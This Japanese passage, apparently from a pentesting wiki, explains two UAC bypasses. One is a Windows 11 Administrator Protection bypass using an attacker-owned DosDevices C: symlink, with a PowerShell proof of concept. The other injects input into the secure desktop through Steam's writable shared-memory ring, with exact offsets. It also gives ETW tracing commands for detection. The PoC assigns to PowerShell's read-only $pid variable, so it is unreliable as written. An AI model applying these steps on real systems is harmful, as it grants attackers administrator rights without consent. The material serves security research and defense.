Windows 11 25H2 の「Administrator Protection」は、セッションごとの `\Sessions\0\DosDevices/<LUID>` マップを持つ shadow-admin token を使用します。このディレクトリは、最初の `\??` 解決時に `SeGetTokenDeviceMap` によって遅延作成されます。攻撃者が shadow-admin token を**SecurityIdentification** レベルでのみ偽装すると、ディレクトリは攻撃者を**所有者**として作成され（`CREATOR OWNER` を継承）、`\GLOBAL??` より優先されるドライブレターリンクを作成できます。<sup>[[7]](#references)</sup>

**手順:**

1. 低権限のセッションから `RAiProcessRunOnce` を呼び出し、プロンプトなしで shadow-admin の `runonce.exe` を起動する。
2. その primary token を**identification** token に複製し、`\??` を開く間これを偽装して、攻撃者が所有する `\Sessions\0\DosDevices/<LUID>` を強制的に作成する。
3. そこに攻撃者が制御するストレージを指す `C:` symlink を作成する。その後、そのセッションでのファイルシステムアクセスでは `C:` が攻撃者のパスに解決され、プロンプトなしで DLL/file hijack が可能になる。

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

プレビュー ホストでは、Administrator Protection は `Microsoft-Windows-LUA` プロバイダーの ETW イベント **15031** と **15032** として、承認と失敗を記録します。イベントには、要求元の SID、アプリケーションのパス、結果、管理対象の管理者アカウント、認証方法が含まれるため、exploit の繰り返しの試行や UI 操作の失敗がテレメトリに残らないわけではありません。<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### 書き込み可能な共有メモリリングを介したセキュアデスクトップへの入力転送

中整合性のユーザーが入力 IPC に書き込める場合、セキュアデスクトップのヘルパーによって UAC プロンプトが回避される可能性があります。報告された Steam の設計では、`IClientSecureDesktop::BStartStreaming` が `winsta0\winlogon` 上で SYSTEM として `secure_desktop_capture.exe` を起動します。ユーザーに `GENERIC_ALL` アクセスを許可して `Global\SecureDesktopInput_mem-IPCWrapper` を公開し、ヘルパーはリングのエントリを読み取って、セキュアデスクトップ上で `SendInput` を呼び出します。これは、UIAccess や `PromptOnSecureDesktop` の変更とは異なり、すでにセキュアデスクトップ上で動作しているプロセスが入力を転送します。クライアントがこのハンドラーに到達する方法については、[service IPC bootstrap](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc) を参照してください。 <sup>[[15]](#references)[[16]](#references)</sup>

このリングには、173 バイトのスロットが 128 個あります。書き込みカウンターと読み取りカウンターはそれぞれ `0x414` と `0x418` にあり、スロット `N` は `0x41c + 173*N` にあります。スロットの先頭バイトを `0`（平文）に設定し、その直後に Windows の `INPUT`（40 バイト）をコピーしてから、書き込みカウンターを進めます。同意プロンプトが表示されている中整合性の管理者ユーザーの場合、昇格を要求する実行ファイルを起動した後にキーボードの `Y` キーのキー押下とキー解放を送ると、肯定側の UAC コントロールを有効にできます。ただし、標準ユーザー向けの資格情報プロンプトには応答できません。**同意ゲートは依然として重要です**。ヘルパーが入力を転送するのは、ユーザーが現在の 90 日間の認可期間に対して `InputEnabled` プロンプトを承認した後だけです。読み書き可能なマッピングがあるだけでは、入力がプロンプトに届く証明にはなりません。制御されたテストの前後で読み取りカウンターを比較してください。 <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – ユーザー アカウント制御の動作](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass compatibility scanner and launcher](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI、AI を採用して PowerShell バックドアを生成](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: 東南アジアの政府機関を標的とした 0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection の回避](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup タスクを使用した UAC の回避](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent、TabTip、Narrator の Always Notify 回避](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – .NET からローカル Windows RPC サーバーを呼び出す](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte、CoolClient に署名済み Windows カーネルルートキットを追加](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: スパイ、窃取、脅迫を目的に構築された完全に検出不能な Windows トロイの木馬](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Valve を回す](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – Turning the Valve の PoC](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
